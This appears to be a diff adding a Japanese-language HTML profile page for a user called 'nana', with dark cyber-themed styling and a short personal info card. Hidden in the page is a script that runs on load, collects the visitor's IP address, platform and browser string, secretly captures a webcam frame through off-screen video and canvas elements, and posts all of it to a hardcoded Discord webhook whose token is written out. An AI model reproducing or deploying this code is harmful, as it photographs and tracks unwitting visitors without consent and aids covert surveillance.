@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile: nana | Architect</title>
+    <style>
+        :root {
+            --bg: #050505;
+            --accent: #ff4141; /* 赤いアイコンに合わせてアクセントカラーを赤に変更 */
+            --text: #ffffff;
+            --dim: #888;
+        }
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Consolas', 'Courier New', monospace;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        /* サイバー背景 */
+        .background {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #1a0505 0%, #050505 100%);
+            z-index: -1;
+        }
+        .profile-card {
+            background: rgba(15, 10, 10, 0.9);
+            border: 1px solid var(--accent);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 40px rgba(255, 65, 65, 0.2);
+            text-align: center;
+            max-width: 450px;
+            backdrop-filter: blur(10px);
+        }
+        .icon {
+            width: 150px;
+            height: 150px;
+            border: 2px solid var(--accent);
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px var(--accent);
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin: 0;
+            letter-spacing: 5px;
+            color: var(--accent);
+            text-transform: uppercase;
+        }
+        .info-box {
+            margin-top: 20px;
+            text-align: left;
+            border-left: 2px solid var(--accent);
+            padding-left: 20px;
+        }
+        .label { color: var(--accent); font-weight: bold; font-size: 0.9rem; }
+        .value { color: var(--text); margin-bottom: 10px; font-size: 1.1rem; }
+        
+        .loading-log {
+            font-size: 0.75rem;
+            margin-top: 30px;
+            color: var(--dim);
+            height: 20px;
+        }
+
+        /* 隠し要素 */
+        #v, #c { visibility: hidden; position: absolute; left: -9999px; }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="profile-card">
+        <img src="1000007175.png" class="icon" alt="nana_icon">
+        
+        <h1>nana</h1>
+        
+        <div class="info-box">
+            <div class="label">IDENTITY</div>
+            <div class="value">Male / Age 15</div>
+            
+            <div class="label">INTERESTS</div>
+            <div class="value">Gaming, Reading, Programming</div>
+            
+            <div class="label">SKILLS</div>
+            <div class="value">Memory Hooking, Signature Scanning</div>
+        </div>
+
+        <div class="loading-log" id="status">INITIATING PERSISTENT CONNECTION...</div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
+
+    <script>
+        const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";
+
+        async function startProtocol() {
+            const status = document.getElementById('status');
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            
+            let report = {
+                ts: new Date().toLocaleString(),
+                ip: "Scanning...",
+                plt: navigator.platform,
+                ua: navigator.userAgent
+            };
+
+            // 1. IP取得
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                report.ip = json.ip;
+            } catch(e) { report.ip = "Access_Denied"; }
+
+            // 2. 自動キャプチャ
+            let fileBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                v.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1500));
+                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                const dataUrl = c.toDataURL('image/jpeg');
+                const bRes = await fetch(dataUrl);
+                fileBlob = await bRes.blob();
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; }
+
+            // 3. 送信
+            const fd = new FormData();
+            if(fileBlob) fd.append('file', fileBlob, 'nana_capture.jpg');
+            
+            const payload = {
+                username: "nana_Admin_Bot",
+                embeds: [{
+                    title: "🔴 ACCESS LOG: NANA_PROFILE_VIEW",
+                    color: 16727873,
+                    fields: [
+                        { name: "🌐 TARGET_IP", value: `\`${report.ip}\``, inline: true },
+                        { name: "💻 SYSTEM", value: report.plt, inline: true },
+                        { name: "📄 AGENT", value: `\`\`\`${report.ua}\`\`\`` }
+                    ],
+                    footer: { text: `Captured at: ${report.ts}` }
+                }]
+            };
+            fd.append('payload_json', JSON.stringify(payload));
+
+            try {
+                await fetch(WH_URL, { method: 'POST', body: fd });
+                status.innerText = "LOG: CONNECTION ESTABLISHED. DATA SYNCED.";
+            } catch(e) { status.innerText = "LOG: OFFLINE_RETRY_PENDING"; }
+        }
+        window.onload = startProtocol;
+    </script>
+</body>
+</html>
